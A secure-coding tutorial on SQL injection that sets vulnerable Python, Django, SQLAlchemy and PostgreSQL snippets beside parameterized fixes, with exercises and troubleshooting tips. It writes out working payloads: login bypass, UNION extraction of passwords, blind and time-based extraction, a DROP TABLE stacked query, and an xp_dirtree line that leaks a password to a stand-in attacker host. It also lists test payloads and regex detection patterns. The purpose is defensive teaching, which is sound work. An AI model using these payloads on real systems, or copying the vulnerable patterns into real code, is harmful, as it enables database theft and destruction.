SQL Injection: Attack Vectors and Prevention

Intuition

Think of a SQL query as a form letter with designated blank spaces. Parameterized queries are like printing the letter first and then filling in the blanks with a pen — the pen marks can never change the printed structure of the letter. SQL injection is what happens when you let someone dictate the entire letter including its structure — they can rewrite the sentences, add new paragraphs, or cross out sections entirely.

SQL Injection: Attack Vectors and Prevention

SQL injection (SQLi) remains one of the most dangerous and prevalent vulnerabilities in web applications. Despite being well-understood for over two decades, it consistently appears in the OWASP Top 10 and continues to be exploited in major breaches. As a backend engineer, understanding every facet of SQL injection — from classic attack vectors to subtle ORM pitfalls — is essential for building secure systems.

What Is SQL Injection?

SQL injection occurs when untrusted data is incorporated into a SQL query without proper sanitization or parameterization. An attacker crafts input that alters the intended SQL statement, allowing them to read, modify, or delete data, bypass authentication, or even execute operating system commands.

The fundamental issue is mixing code (SQL) with data (user input). When the boundary between the two is blurred, the database cannot distinguish between the developer's intended query structure and the attacker's malicious additions.

Classic (In-Band) SQL Injection

Classic SQL injection is the most straightforward form. The attacker's payload modifies the query, and the results are returned directly in the application's response.

Vulnerable Pattern: String Concatenation

# VULNERABLE — Never do this
import psycopg2

def get_user(username):
    conn = psycopg2.connect(dbname="myapp")
    cursor = conn.cursor()
    query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

An attacker passing admin' OR '1'='1 as the username produces:

SELECT id, username, email FROM users WHERE username = 'admin' OR '1'='1'

This returns every user in the table because '1'='1' is always true.

Tautology-Based Authentication Bypass

Consider a login function:

# VULNERABLE
def authenticate(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    return user is not None

With input username = admin' -- and any password, the query becomes:

SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

The -- comment syntax causes the database to ignore the password check entirely.

UNION-Based SQL Injection

UNION-based injection leverages the UNION SELECT statement to append additional queries, extracting data from other tables.

# VULNERABLE
def search_products(category):
    query = f"SELECT name, price FROM products WHERE category = '{category}'"
    cursor.execute(query)
    return cursor.fetchall()

An attacker supplies:

' UNION SELECT username, password FROM users --

The resulting query:

SELECT name, price FROM products WHERE category = '' UNION SELECT username, password FROM users --'

This returns product results merged with all usernames and passwords. The attacker must match the number of columns in the original query, which they can discover through systematic probing (e.g., ORDER BY 1, ORDER BY 2, etc. until an error occurs).

Blind SQL Injection

When the application does not display query results or error messages directly, attackers use blind techniques to extract data one bit at a time.

Boolean-Based Blind Injection

The attacker infers information by observing whether the application behaves differently for true vs. false conditions.

# VULNERABLE
def check_user_exists(user_id):
    query = f"SELECT 1 FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone() is not None

Attacker input: 1 AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'

If the response indicates the user exists, the first character of the admin password is 'a'. The attacker repeats this for each character position and value, automating the process with tools like sqlmap.

Time-Based Blind Injection

When even boolean differences are not observable, attackers use database sleep functions to infer results from response timing.

1; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN pg_sleep(5) ELSE pg_sleep(0) END --

If the response takes approximately 5 seconds, the guess was correct. This is slower but works even when application responses are completely uniform.

Second-Order SQL Injection

Second-order (or stored) SQL injection is particularly insidious because the malicious payload is stored safely in the database and only triggers when it is later used in another query.

# Step 1: Registration — input is properly parameterized during INSERT
def register_user(username, password):
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (%s, %s)",
        (username, password)
    )
    conn.commit()

# Step 2: Profile update — VULNERABLE because stored data is trusted
def update_email(current_username, new_email):
    cursor.execute(f"SELECT username FROM users WHERE username = '{current_username}'")
    row = cursor.fetchone()
    stored_username = row[0]
    # Developer assumes stored_username is safe because it came from the DB
    cursor.execute(
        f"UPDATE users SET email = '{new_email}' WHERE username = '{stored_username}'"
    )
    conn.commit()

An attacker registers with username admin' --. The INSERT is parameterized, so the value is stored literally. But when update_email reads it back and interpolates it into a new query, the injection activates. The lesson: data from your own database is not inherently safe.

Stored Procedure Injection

Stored procedures are sometimes mistakenly believed to be immune to SQL injection. They are not, particularly when they use dynamic SQL internally.

-- VULNERABLE stored procedure (PostgreSQL)
CREATE OR REPLACE FUNCTION search_users(search_term TEXT)
RETURNS SETOF users AS $$
BEGIN
    RETURN QUERY EXECUTE
        'SELECT * FROM users WHERE username LIKE ''%' || search_term || '%''';
END;
$$ LANGUAGE plpgsql;

The EXECUTE with string concatenation inside the procedure is just as vulnerable as doing it in application code. The safe version uses EXECUTE ... USING:

-- SAFE stored procedure
CREATE OR REPLACE FUNCTION search_users(search_term TEXT)
RETURNS SETOF users AS $$
BEGIN
    RETURN QUERY EXECUTE
        'SELECT * FROM users WHERE username LIKE $1'
        USING '%' || search_term || '%';
END;
$$ LANGUAGE plpgsql;

ORM-Specific Pitfalls

ORMs generally protect against SQL injection by using parameterized queries under the hood. However, every major ORM provides escape hatches for raw SQL, and these are where vulnerabilities creep in.

SQLAlchemy Core — Vulnerable vs. Safe

from sqlalchemy import create_engine, text, Table, MetaData, select

engine = create_engine("postgresql://localhost/myapp")
metadata = MetaData()
users = Table('users', metadata, autoload_with=engine)

# VULNERABLE — raw string interpolation with text()
def get_user_vulnerable(username):
    with engine.connect() as conn:
        result = conn.execute(
            text(f"SELECT * FROM users WHERE username = '{username}'")
        )
        return result.fetchone()

# SAFE — bound parameters with text()
def get_user_safe(username):
    with engine.connect() as conn:
        result = conn.execute(
            text("SELECT * FROM users WHERE username = :username"),
            {"username": username}
        )
        return result.fetchone()

# SAFE — using the SQLAlchemy expression language
def get_user_expression(username):
    with engine.connect() as conn:
        stmt = select(users).where(users.c.username == username)
        result = conn.execute(stmt)
        return result.fetchone()

The expression language (select, where, join, etc.) is the preferred approach because it constructs parameterized queries automatically and provides compile-time structure that is harder to misuse.

SQLAlchemy ORM — Vulnerable vs. Safe

from sqlalchemy.orm import Session
from sqlalchemy import text

# VULNERABLE — raw SQL in ORM session
def find_user_vulnerable(session: Session, username: str):
    return session.execute(
        text(f"SELECT * FROM users WHERE username = '{username}'")
    ).fetchone()

# SAFE — parameterized raw SQL
def find_user_safe_raw(session: Session, username: str):
    return session.execute(
        text("SELECT * FROM users WHERE username = :username"),
        {"username": username}
    ).fetchone()

# SAFE — ORM query interface
def find_user_safe_orm(session: Session, username: str):
    return session.query(User).filter(User.username == username).first()

# VULNERABLE — filter with raw string
def find_user_filter_vulnerable(session: Session, username: str):
    return session.query(User).filter(
        text(f"username = '{username}'")
    ).first()

Note the last example: even within the ORM query interface, using text() with string formatting reintroduces the vulnerability. The safest pattern is always using the ORM's attribute-based filtering.

Django ORM — Vulnerable vs. Safe

from django.db import connection
from myapp.models import User

# VULNERABLE — raw SQL with string formatting
def get_user_vulnerable(username):
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT * FROM auth_user WHERE username = '{username}'")
        return cursor.fetchone()

# SAFE — parameterized raw SQL
def get_user_safe_raw(username):
    with connection.cursor() as cursor:
        cursor.execute(
            "SELECT * FROM auth_user WHERE username = %s",
            [username]
        )
        return cursor.fetchone()

# SAFE — Django ORM
def get_user_safe_orm(username):
    return User.objects.filter(username=username).first()

# VULNERABLE — extra() with raw SQL (deprecated for good reason)
def get_user_extra_vulnerable(username):
    return User.objects.extra(
        where=[f"username = '{username}'"]
    )

# SAFE — extra() with params
def get_user_extra_safe(username):
    return User.objects.extra(
        where=["username = %s"],
        params=[username]
    )

Django's extra() method, RawSQL() expressions, and raw() queryset method all accept raw SQL and can be injection vectors if misused. Django has deprecated extra() partly for this reason.

Web Application Firewall (WAF) Considerations

WAFs can provide a layer of defense by detecting and blocking common SQL injection patterns. However, they should never be your primary defense.

Why WAFs are insufficient alone:

  1. Bypass techniques are well-documented. Attackers use encoding tricks, comment insertion, case variation, and other obfuscation methods to evade WAF signatures.
  2. False positives. Overly aggressive WAF rules block legitimate traffic. A user searching for "O'Brien" might trigger injection rules.
  3. Context blindness. WAFs analyze HTTP requests but lack understanding of your application's SQL context, leading to both false positives and false negatives.
  4. Second-order injection is invisible to WAFs. The malicious payload enters through a legitimate-looking request and triggers later.

WAFs are best used as part of a defense-in-depth strategy — a safety net, not a primary control.

Defense-in-Depth: Comprehensive Prevention Strategy

Layer 1: Parameterized Queries (Primary Defense)

This is the single most important defense. Every database driver supports parameterized queries. Use them without exception.

# The golden rule — always use parameterized queries
def safe_query(cursor, username, status):
    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND status = %s",
        (username, status)
    )
    return cursor.fetchall()

Parameterized queries work because the database receives the query structure and data separately. The database compiles the query structure first, then binds the data values. There is no opportunity for the data to alter the query structure.

Layer 2: Input Validation

Validate and constrain input to expected formats before it reaches any query:

import re

def validate_username(username: str) -> str:
    if not re.match(r'^[a-zA-Z0-9_]{3,30}$', username):
        raise ValueError("Invalid username format")
    return username

def validate_sort_column(column: str) -> str:
    allowed_columns = {'username', 'email', 'created_at', 'id'}
    if column not in allowed_columns:
        raise ValueError(f"Invalid sort column: {column}")
    return column

def validate_sort_order(order: str) -> str:
    if order.upper() not in ('ASC', 'DESC'):
        raise ValueError("Sort order must be ASC or DESC")
    return order.upper()

Input validation is especially critical for query elements that cannot be parameterized, such as table names, column names, and sort directions. These must be validated against whitelists.

# Table/column names CANNOT be parameterized — use whitelisting
def dynamic_sort_query(cursor, sort_column, sort_order):
    column = validate_sort_column(sort_column)
    order = validate_sort_order(sort_order)
    # Safe because values are from a whitelist, not user input
    cursor.execute(
        f"SELECT id, username, email FROM users ORDER BY {column} {order}"
    )
    return cursor.fetchall()

Layer 3: Principle of Least Privilege

Your application's database user should have only the permissions it needs:

-- Create a restricted application user
CREATE USER app_readonly WITH PASSWORD 'secure_password';
GRANT SELECT ON users, products, orders TO app_readonly;

-- Separate user for write operations
CREATE USER app_writer WITH PASSWORD 'another_secure_password';
GRANT SELECT, INSERT, UPDATE ON users, products, orders TO app_writer;
-- Note: no DELETE, no DROP, no access to admin tables

Even if an attacker achieves injection, they cannot DROP TABLE or access tables outside the granted permissions.

Layer 4: Error Handling

Never expose database error messages to users. Detailed errors help attackers understand your schema and refine their payloads.

import logging

logger = logging.getLogger(__name__)

def get_user_safe(username):
    try:
        cursor.execute(
            "SELECT * FROM users WHERE username = %s",
            (username,)
        )
        return cursor.fetchone()
    except Exception as e:
        # Log the full error internally
        logger.error(f"Database error in get_user: {e}", exc_info=True)
        # Return a generic error to the user
        raise ApplicationError("An internal error occurred. Please try again.")

Layer 5: Monitoring and Detection

Implement monitoring to detect injection attempts:

import re
import logging

security_logger = logging.getLogger('security')

SQLI_PATTERNS = [
    re.compile(r"('|\")(\s)*(OR|AND)(\s)+(1|true)", re.IGNORECASE),
    re.compile(r"UNION(\s)+SELECT", re.IGNORECASE),
    re.compile(r"(;)(\s)*(DROP|ALTER|DELETE|UPDATE|INSERT)", re.IGNORECASE),
    re.compile(r"(pg_sleep|SLEEP|BENCHMARK|WAITFOR)", re.IGNORECASE),
]

def check_for_sqli(user_input: str, field_name: str, request_id: str):
    for pattern in SQLI_PATTERNS:
        if pattern.search(user_input):
            security_logger.warning(
                f"Potential SQLi detected | request_id={request_id} "
                f"| field={field_name} | input={user_input[:200]}"
            )
            return True
    return False

This should not be used as a primary defense (parameterized queries handle that), but rather as an alerting mechanism to identify attackers probing your system.

Advanced Attack Vectors to Be Aware Of

Batched (Stacked) Queries

Some database drivers allow multiple statements separated by semicolons:

1; DROP TABLE users; --

Most modern drivers (including psycopg2 for PostgreSQL) do not allow stacked queries by default with parameterized execution, but raw execute() with string concatenation may permit them depending on configuration.

Out-of-Band Extraction

In restricted environments where neither results nor timing differences are observable, attackers may use database-specific features to exfiltrate data via DNS or HTTP requests:

-- SQL Server example
EXEC xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users) + '.txt'

This sends a DNS request containing data to the attacker's server. Defense relies on network-level controls (restrict outbound traffic from DB servers) and, of course, preventing injection in the first place.

JSON and NoSQL Injection Variants

Modern applications using JSON operators in SQL are also susceptible:

# VULNERABLE — PostgreSQL JSON query
def search_metadata(key, value):
    query = f"SELECT * FROM items WHERE metadata->>'{key}' = '{value}'"
    cursor.execute(query)
    return cursor.fetchall()

# SAFE
def search_metadata_safe(key, value):
    allowed_keys = {'color', 'size', 'brand'}
    if key not in allowed_keys:
        raise ValueError("Invalid metadata key")
    cursor.execute(
        f"SELECT * FROM items WHERE metadata->>'{key}' = %s",
        (value,)
    )
    return cursor.fetchall()

Note that even in the safe version, the key must be whitelisted because JSON field names, like column names, cannot be parameterized.

Testing for SQL Injection

During development, use these approaches to verify your code is not vulnerable:

  1. Unit tests with malicious payloads:
import pytest

class TestSQLInjectionPrevention:
    MALICIOUS_INPUTS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "1 AND (SELECT COUNT(*) FROM users) > 0",
        "admin'/*",
        "1; WAITFOR DELAY '0:0:5' --",
    ]

    def test_get_user_handles_injection_attempts(self):
        for payload in self.MALICIOUS_INPUTS:
            # Should return None, not raise an error or return unexpected data
            result = get_user_safe(payload)
            assert result is None, f"Possible SQLi vulnerability with payload: {payload}"

    def test_search_does_not_return_all_records(self):
        result = search_products_safe("' OR '1'='1")
        assert len(result) == 0  # Should match no real category

  1. Static analysis tools: Use tools like bandit (Python) which detect string formatting in SQL contexts.

  2. Dynamic analysis: Run sqlmap or similar tools against your staging environment to verify WAF rules and application-level defenses.

Summary of Key Principles

Principle Implementation
Parameterize all queries Use %s (psycopg2), :param (SQLAlchemy), %s (Django)
Whitelist identifiers Table names, column names, sort orders must be validated against allowed sets
Use ORM query builders Prefer User.objects.filter() or session.query().filter() over raw SQL
Least privilege Application DB users should only have required permissions
Suppress error details Log internally, show generic messages externally
Defense in depth Combine parameterization + validation + WAF + monitoring + least privilege
Trust no data Even data from your own database may contain payloads (second-order injection)

SQL injection is a solved problem in the sense that we know exactly how to prevent it. The challenge is discipline: ensuring that every single query path in your application uses the correct patterns, and that code reviews catch the rare instances where someone takes a shortcut. Build secure defaults into your codebase, use linters and static analysis to enforce them, and treat any raw SQL concatenation as a critical security finding.

Exercises

  1. Identify and Fix Vulnerable Endpoints

    You are given the following Flask application with three endpoints. Identify which endpoints are vulnerable to SQL injection and rewrite them to be safe.

    from flask import Flask, request
import psycopg2

app = Flask(__name__)
conn = psycopg2.connect(dbname='store')

@app.route('/products')
def list_products():
    category = request.args.get('category', '')
    sort = request.args.get('sort', 'name')
    cursor = conn.cursor()
    cursor.execute(
        f"SELECT * FROM products WHERE category = '{category}' ORDER BY {sort}"
    )
    return {'products': cursor.fetchall()}

@app.route('/product/<int:product_id>')
def get_product(product_id):
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM products WHERE id = %s", (product_id,)
    )
    return {'product': cursor.fetchone()}

@app.route('/search')
def search():
    q = request.args.get('q', '')
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM products WHERE name LIKE '%%" + q + "%%'"
    )
    return {'results': cursor.fetchall()}

    For each vulnerable endpoint, explain the attack vector and provide the corrected code.

    Hint

    The /product endpoint is already safe (parameterized with %s and the route enforces int). The /products endpoint has TWO injection points: the category value and the sort column. The /search endpoint uses string concatenation for a LIKE query. Remember that column names cannot be parameterized — use a whitelist.

  2. Exploit and Defend a Blind Injection

    Given this vulnerable function:

    def user_exists(user_id):
    cursor.execute(f"SELECT 1 FROM users WHERE id = {user_id}")
    return cursor.fetchone() is not None
    1. Write a Python script that exploits this boolean-based blind injection to extract the admin user's password character by character. Assume the function returns True/False and the password column exists in the users table.
    2. Then rewrite user_exists to be safe against injection.
    3. Write a unit test that verifies your safe version handles malicious input correctly.
    Hint

    For the exploit, iterate through character positions and for each position try characters a-z, 0-9 by injecting something like: 1 AND (SELECT SUBSTRING(password, {pos}, 1) FROM users WHERE username='admin') = '{char}'. For the fix, simply use parameterized queries with %s. For the test, pass SQL injection payloads and assert the function returns False without errors.

  3. Second-Order Injection Scenario

    Design a complete test scenario demonstrating second-order SQL injection. Create: 1. A register(username, email) function that safely inserts a user using parameterized queries. 2. A change_password(username, new_password) function that is vulnerable because it reads the username from the database and uses it in a raw query. 3. Show the exact sequence of calls an attacker would make to change the admin's password. 4. Fix the change_password function. 5. Write an integration test that proves the vulnerability existed and is now fixed.

    Hint

    The attacker registers with a username like admin' --. The INSERT is parameterized so the value is stored literally. When change_password retrieves this username and concatenates it into an UPDATE query, the injection activates and modifies the admin's password instead. The fix is to parameterize the UPDATE query as well.

  4. Build a SQLi Detection Middleware

    Create a Flask/Django middleware that: 1. Inspects all incoming request parameters (query string, form data, JSON body) for common SQL injection patterns. 2. Logs suspicious requests with full context (IP, endpoint, parameter name, matched pattern) to a security log. 3. Does NOT block requests (to avoid false positives) — only alerts. 4. Includes at least 10 detection patterns covering UNION, stacked queries, comment injection, time-based payloads, and common tautologies. 5. Write tests that verify the middleware correctly flags known injection payloads while not flagging legitimate inputs like "O'Brien" or "SELECT" (as a product name).

    Discuss why this middleware should never replace parameterized queries.

    Hint

    Use regex patterns to detect signatures like UNION SELECT, OR 1=1, semicolons followed by DDL/DML keywords, comment sequences (-- or /*), and sleep/benchmark functions. Be careful with patterns that are too broad — 'SELECT' alone in a product name is legitimate. The key insight for the discussion is that detection is inherently a cat-and-mouse game (attackers can encode/obfuscate), while parameterization is a structural guarantee.

Common Problems & Solutions

1 ORM queries are still vulnerable to SQL injection despite using an ORM
Symptoms: Using Django's `extra()`, `raw()`, or SQLAlchemy's `text()` with string formatting results in injection even though the rest of the codebase uses the ORM safely.
Cause: ORMs provide escape hatches for raw SQL. When developers use these escape hatches with string concatenation or f-strings instead of parameter binding, the ORM's built-in protections are bypassed entirely.
Solution: Always pass user input as parameters, even in raw SQL within an ORM. In Django, use `cursor.execute(sql, [params])` or `Model.objects.raw(sql, [params])`. In SQLAlchemy, use `text(sql).bindparams(key=value)` or pass a dict as the second argument to `session.execute()`. Prefer the ORM query builder (e.g., `.filter()`, `.where()`) whenever possible and restrict raw SQL to code-reviewed, parameterized-only usage.

Django — VULNERABLE

User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{name}'")

Django — SAFE

User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [name])

SQLAlchemy — VULNERABLE

session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

SQLAlchemy — SAFE

session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})

2 Dynamic column names or table names cannot be parameterized, leading to injection
Symptoms: The application needs to support user-selected sort columns or dynamic table references. Parameterized queries raise errors when used for identifiers (e.g., `psycopg2.errors.SyntaxError` when trying to parameterize a column name).
Cause: SQL parameters can only substitute values, not identifiers (table names, column names, schema names). Developers resort to string formatting, which opens injection vectors.
Solution: Use strict whitelisting for any dynamic identifiers. Map user input to a predefined set of allowed values. For frameworks that support it, use identifier quoting functions (e.g., `psycopg2.sql.Identifier`) which safely escape identifiers.

from psycopg2 import sql

ALLOWED_SORT_COLUMNS = {'name', 'price', 'created_at', 'rating'}

def sort_products(cursor, sort_column, sort_dir): if sort_column not in ALLOWED_SORT_COLUMNS: raise ValueError(f"Invalid sort column: {sort_column}") if sort_dir.upper() not in ('ASC', 'DESC'): raise ValueError(f"Invalid sort direction: {sort_dir}")

query = sql.SQL("SELECT * FROM products ORDER BY {col} {dir}").format(
    col=sql.Identifier(sort_column),
    dir=sql.SQL(sort_dir.upper())
)
cursor.execute(query)
3 IN clause with variable number of parameters is constructed unsafely
Symptoms: A query with `WHERE id IN (...)` needs to accept a variable-length list. Developers join the values into a comma-separated string and interpolate it, creating an injection vector.
Cause: Building `IN (1, 2, 3)` dynamically tempts developers into string concatenation because the number of placeholders varies per request.
Solution: Generate the correct number of parameter placeholders dynamically, or use database-specific array/tuple features. Most ORMs handle this natively.

VULNERABLE

def get_users_by_ids_unsafe(cursor, id_list): ids = ', '.join(str(i) for i in id_list) # Trusting input to be ints cursor.execute(f"SELECT * FROM users WHERE id IN ({ids})")

SAFE — dynamic placeholders (psycopg2)

def get_users_by_ids_safe(cursor, id_list): placeholders = ', '.join(['%s'] * len(id_list)) cursor.execute( f"SELECT * FROM users WHERE id IN ({placeholders})", tuple(id_list) )

SAFE — using psycopg2's tuple adaptation

def get_users_by_ids_tuple(cursor, id_list): cursor.execute( "SELECT * FROM users WHERE id = ANY(%s)", (list(id_list),) )

SAFE — Django ORM (handles it automatically)

User.objects.filter(id__in=id_list)
